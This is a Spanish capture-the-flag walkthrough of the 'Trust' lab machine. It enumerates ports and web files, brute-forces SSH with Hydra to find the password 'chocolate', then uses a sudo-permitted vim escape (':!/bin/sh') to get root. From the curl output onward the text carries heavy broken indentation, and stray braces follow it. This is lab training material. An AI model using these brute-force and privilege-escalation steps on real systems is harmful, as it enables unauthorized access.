
### 1. Máquina: Trust  
**Dificultad:** Muy Fácil

---

### Desplegando la Máquina Vulnerable

```bash
sudo bash auto_deploy.sh trust.tar
```

**Salida:**

```
Estamos desplegando la máquina vulnerable, espere un momento.

Máquina desplegada, su dirección IP es --> 172.18.0.2
Presiona Ctrl+C cuando termines con la máquina para eliminarla
```

Este comando ejecuta un script de bash (`auto_deploy.sh`) que despliega la máquina vulnerable a partir del archivo `trust.tar`.

### Verificación de Conectividad

```bash
ping -c 2 172.18.0.2
```

**Salida:**

```
PING 172.18.0.2 (172.18.0.2) 56(84) bytes of data.
64 bytes from 172.18.0.2: icmp_seq=1 ttl=64 time=0.441 ms
64 bytes from 172.18.0.2: icmp_seq=2 ttl=64 time=0.076 ms

--- 172.18.0.2 ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1022ms
rtt min/avg/max/mdev = 0.076/0.258/0.441/0.182 ms
```

El comando `ping -c 2` envía 2 paquetes ICMP a la dirección IP `172.18.0.2` para verificar la conectividad y la respuesta del host.

### Escaneo de Puertos con Nmap

```bash
nmap -p- -sCV 172.18.0.2
```

**Salida:**

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.57 ((Debian))
```

**Explicación de parámetros:**

- `-p-`: Escanea todos los puertos (del 1 al 65535).
- `-sCV`: Realiza un escaneo con detección de versión (`-sV`) y utiliza scripts básicos (`-sC`) para obtener más información del servicio.

Este comando revela que los puertos `22` (SSH) y `80` (HTTP) están abiertos, con `OpenSSH` y `Apache` ejecutándose en ellos respectivamente.

### Enumeración de Directorios con Gobuster

```bash
gobuster dir -w $seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://172.18.0.2:80/ -t 200 -x php,html
```

**Salida:**

```
/index.html           (Status: 200) [Size: 10701]
/secret.php           (Status: 200) [Size: 927]
```

**Explicación de parámetros:**

- `dir`: Modo de enumeración de directorios.
- `-w`: Especifica la wordlist a utilizar.
- `-u`: URL objetivo a escanear.
- `-t 200`: Define el número de hilos a usar (200 en este caso).
- `-x php,html`: Busca archivos con extensiones `.php` y `.html`.

Este comando encuentra dos archivos en el servidor web: `index.html` y `secret.php`.

### Visualización de Contenido con cURL

```bash
curl http://172.18.0.2/secret.php
```

**Salida:**

```html
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>¡Secreto!</title>
                <style>
                        body {
                        	            font-family: Arial, sans-serif;
                        	                        background-color: #f0f0f0;
                        	                                    margin: 0;
                        	                                                padding: 0;
                        	                                                            display: flex;
                        	                                                                        justify-content: center;
                        	                                                                                    align-items: center;
                        	                                                                                                height: 100vh;
                        	                                                                                                        }
                        	                                                                                                                .container {
                        	                                                                                                                	            text-align: center;
                        	                                                                                                                	                        background-color: #fff;
                        	                                                                                                                	                                    padding: 20px;
                        	                                                                                                                	                                                border-radius: 10px;
                        	                                                                                                                	                                                            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
                        	                                                                                                                	                                                                    }
                        	                                                                                                                	                                                                            h1 {
                        	                                                                                                                	                                                                            	            color: #333;
                        	                                                                                                                	                                                                            	                    }
                        	                                                                                                                	                                                                            	                            p {
                        	                                                                                                                	                                                                            	                            	            color: #666;
                        	                                                                                                                	                                                                            	                            	                    }
                        	                                                                                                                	                                                                            	                            	                        </style>
                        	                                                                                                                	                                                                            	                            	                        </head>
                        	                                                                                                                	                                                                            	                            	                        <body>
                        	                                                                                                                	                                                                            	                            	                            <div class="container">
                        	                                                                                                                	                                                                            	                            	                                    <h1>¡Secreto revelado!</h1>
                        	                                                                                                                	                                                                            	                            	                                            <p>Este es un archivo de ejemplo en la máquina vulnerable Trust.</p>
                        	                                                                                                                	                                                                            	                            	                                                </div>
                        	                                                                                                                	                                                                            	                            	                                                </body>
                        	                                                                                                                	                                                                            	                            	                                                </html>
                        	                                                                                                                	                                                                            	                            	                                                ```

                        	                                                                                                                	                                                                            	                            	                                                El comando `curl` se utiliza para ver el contenido del archivo `secret.php`, que contiene un mensaje de ejemplo.

                        	                                                                                                                	                                                                            	                            	                                                ### Fuerza Bruta SSH con Hydra

                        	                                                                                                                	                                                                            	                            	                                                ```bash
                        	                                                                                                                	                                                                            	                            	                                                hydra -l mario -P $seclists/Passwords/probable-v2-top12000.txt ssh://172.18.0.2 -I -t 32
                        	                                                                                                                	                                                                            	                            	                                                ```

                        	                                                                                                                	                                                                            	                            	                                                **Salida:**

                        	                                                                                                                	                                                                            	                            	                                                ```
                        	                                                                                                                	                                                                            	                            	                                                [22][ssh] host: 172.18.0.2   login: mario   password: chocolate
                        	                                                                                                                	                                                                            	                            	                                                1 of 1 target successfully completed, 1 valid password found
                        	                                                                                                                	                                                                            	                            	                                                ```

                        	                                                                                                                	                                                                            	                            	                                                **Explicación de parámetros:**

                        	                                                                                                                	                                                                            	                            	                                                - `-l mario`: Define el usuario como `mario`.
                        	                                                                                                                	                                                                            	                            	                                                - `-P`: Especifica la wordlist de contraseñas.
                        	                                                                                                                	                                                                            	                            	                                                - `ssh://172.18.0.2`: Define el protocolo y la IP del objetivo.
                        	                                                                                                                	                                                                            	                            	                                                - `-I`: Ejecuta el ataque inmediatamente sin demora.
                        	                                                                                                                	                                                                            	                            	                                                - `-t 32`: Utiliza 32 tareas en paralelo.

                        	                                                                                                                	                                                                            	                            	                                                Hydra encuentra la contraseña `chocolate` para el usuario `mario`.

                        	                                                                                                                	                                                                            	                            	                                                ### Acceso al Servidor SSH

                        	                                                                                                                	                                                                            	                            	                                                ```bash
                        	                                                                                                                	                                                                            	                            	                                                ssh mario@172.18.0.2
                        	                                                                                                                	                                                                            	                            	                                                ```

                        	                                                                                                                	                                                                            	                            	                                                **Salida:**

                        	                                                                                                                	                                                                            	                            	                                                ```
                        	                                                                                                                	                                                                            	                            	                                                mario@172.18.0.2's password:
                        	                                                                                                                	                                                                            	                            	                                                Linux 73cbcae3fd14 5.15.153.1-microsoft-standard-WSL2 #1 SMP Fri Mar 29 23:14:13 UTC 2024 x86_64

                        	                                                                                                                	                                                                            	                            	                                                The programs included with the Debian GNU/Linux system are free software;
                        	                                                                                                                	                                                                            	                            	                                                the exact distribution terms for each program are described in the
                        	                                                                                                                	                                                                            	                            	                                                individual files in /usr/share/doc/*/copyright.

                        	                                                                                                                	                                                                            	                            	                                                Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
                        	                                                                                                                	                                                                            	                            	                                                permitted by applicable law.
                        	                                                                                                                	                                                                            	                            	                                                ```

                        	                                                                                                                	                                                                            	                            	                                                Este comando inicia una sesión SSH en la máquina como el usuario `mario`.

                        	                                                                                                                	                                                                            	                            	                                                ### Enumeración de Privilegios Sudo

                        	                                                                                                                	                                                                            	                            	                                                ```bash
                        	                                                                                                                	                                                                            	                            	                                                sudo -l
                        	                                                                                                                	                                                                            	                            	                                                ```

                        	                                                                                                                	                                                                            	                            	                                                **Salida:**

                        	                                                                                                                	                                                                            	                            	                                                ```
                        	                                                                                                                	                                                                            	                            	                                                Matching Defaults entries for mario on 44c3c47852c5:
                        	                                                                                                                	                                                                            	                            	                                                    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

                        	                                                                                                                	                                                                            	                            	                                                    User mario may run the following commands on 44c3c47852c5:
                        	                                                                                                                	                                                                            	                            	                                                        (ALL) /usr/bin/vim
                        	                                                                                                                	                                                                            	                            	                                                        ```

                        	                                                                                                                	                                                                            	                            	                                                        Este comando muestra que el usuario `mario` tiene permisos para ejecutar `vim` con privilegios de superusuario.

                        	                                                                                                                	                                                                            	                            	                                                        ### Escalada de Privilegios con Vim

                        	                                                                                                                	                                                                            	                            	                                                        #### Búsqueda de técnicas de escalada de privilegios con SearchBins

                        	                                                                                                                	                                                                            	                            	                                                        ```bash
                        	                                                                                                                	                                                                            	                            	                                                        searchbins -b vim -f sudo
                        	                                                                                                                	                                                                            	                            	                                                        ```

                        	                                                                                                                	                                                                            	                            	                                                        **Salida:**

                        	                                                                                                                	                                                                            	                            	                                                        ```
                        	                                                                                                                	                                                                            	                            	                                                        [+] Binary: vim
                        	                                                                                                                	                                                                            	                            	                                                        [*] Function: sudo -> [https://gtfobins.github.io/gtfobins/vim/#sudo]
                        	                                                                                                                	                                                                            	                            	                                                                | sudo vim -c ':!/bin/sh'
                        	                                                                                                                	                                                                            	                            	                                                                This requires that `vim` is compiled with Python support. Prepend `:py3` for Python 3.
                        	                                                                                                                	                                                                            	                            	                                                                        | sudo vim -c ':py import os; os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'
                        	                                                                                                                	                                                                            	                            	                                                                        This requires that `vim` is compiled with Lua support.
                        	                                                                                                                	                                                                            	                            	                                                                                | sudo vim -c ':lua os.execute("reset; exec sh")'
                        	                                                                                                                	                                                                            	                            	                                                                                ```

                        	                                                                                                                	                                                                            	                            	                                                                                SearchBins sugiere varias técnicas para escalar privilegios utilizando `vim`.

                        	                                                                                                                	                                                                            	                            	                                                                                #### Ejecución de la Escalada de Privilegios

                        	                                                                                                                	                                                                            	                            	                                                                                ```bash
                        	                                                                                                                	                                                                            	                            	                                                                                sudo vim -c ':!/bin/sh'
                        	                                                                                                                	                                                                            	                            	                                                                                ```

                        	                                                                                                                	                                                                            	                            	                                                                                **Salida:**

                        	                                                                                                                	                                                                            	                            	                                                                                ```
                        	                                                                                                                	                                                                            	                            	                                                                                # whoami
                        	                                                                                                                	                                                                            	                            	                                                                                root
                        	                                                                                                                	                                                                            	                            	                                                                                ```

                        	                                                                                                                	                                                                            	                            	                                                                                Este comando utiliza `vim` con privilegios de superusuario para ejecutar un shell con permisos de root.
                        	                                                                                                                	                                                                            	                            }
                        	                                                                                                                	                                                                            }
                        	                                                                                                                }
                        }
